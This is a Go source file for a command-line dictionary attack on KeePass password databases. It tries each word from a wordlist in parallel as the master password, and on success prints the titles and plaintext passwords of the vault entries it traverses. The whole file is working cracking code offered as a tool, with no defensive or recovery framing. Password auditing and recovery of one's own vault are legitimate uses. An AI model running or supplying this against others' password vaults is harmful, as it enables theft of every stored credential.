package main

import (
	"bufio"
	"bytes"
	"flag"
	"github.com/tobischo/gokeepasslib/v3"
	"io"
	"log"
	"os"
	"sync"
)

func main() {
	path := flag.String("path", "", "path to the target keepass database file")
	wordlist := flag.String("wordlist", "", "path to the wordlist to be used")
	parallel := flag.Int("parallel", 20, "how many parallel attempts should be run")
	flag.Parse()

	if *path == "" || *wordlist == "" {
		flag.Usage()
		os.Exit(1)
	}

	dbFile, _ := os.Open(*path)
	dbData, _ := io.ReadAll(dbFile)

	var wg sync.WaitGroup

	wordsCh := make(chan string, *parallel)
	wordFile, err := os.Open(*wordlist)
	if err != nil {
		log.Fatalf("failed to open file: %s", err)
	}
	defer wordFile.Close()
	scanner := bufio.NewScanner(wordFile)
	go func() {
		cnt := 0
		for scanner.Scan() {
			cnt++
			line := scanner.Text()

			wordsCh <- line
		}
		close(wordsCh)
	}()

	for i := 1; i <= *parallel; i++ {
		wg.Add(1)
		go worker(&dbData, wordsCh, &wg)
	}

	wg.Wait()
}

func worker(dbData *[]byte, wordsCh chan string, wg *sync.WaitGroup) {
	for word := range wordsCh {
		dbRead := bytes.NewReader(*dbData)
		db := gokeepasslib.NewDatabase()
		db.Credentials = gokeepasslib.NewPasswordCredentials(word)
		_ = gokeepasslib.NewDecoder(dbRead).Decode(db)

		err := db.UnlockProtectedEntries()
		if err == nil {
			log.Printf("we got a winner: %v", word)
			groups := db.Content.Root.Groups
			for _, grp := range groups {
				entries := grp.Entries
				for _, ent := range entries {
					log.Println(ent.GetTitle())
					log.Println(ent.GetPassword())
				}
			}
		}
	}
	wg.Done()
}
